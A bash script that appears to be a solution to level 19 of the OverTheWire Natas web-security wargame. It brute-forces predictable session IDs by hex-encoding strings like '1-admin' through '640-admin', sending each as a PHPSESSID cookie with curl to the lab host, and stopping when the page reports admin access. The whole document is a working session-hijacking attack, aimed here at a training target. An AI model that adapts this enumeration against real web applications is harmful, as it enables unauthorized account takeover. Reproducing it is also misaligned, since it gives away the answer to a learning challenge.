#!/usr/bin/env bash

USER="natas19"
PASS="$1"
URL="http://natas19.natas.labs.overthewire.org/"

if [ -z "$PASS" ]; then
    echo "Usage: $0 <password>"
    exit 1
fi

FOUND=0

for i in $(seq 1 640); do
    RAW="${i}-admin"
    HEX=$(echo -n "$RAW" | xxd -p)

    printf "\r[*] Trying %s -> %s" "$RAW" "$HEX"

    RES=$(curl -s -u "$USER:$PASS" \
        --cookie "PHPSESSID=$HEX" \
        "$URL")

    echo "$RES" | grep -q "You are an admin" && {
        echo
        echo "[+] FOUND: $RAW -> $HEX"
        echo "$RES"
        FOUND=1
        break
    }
done

[ $FOUND -eq 0 ] && echo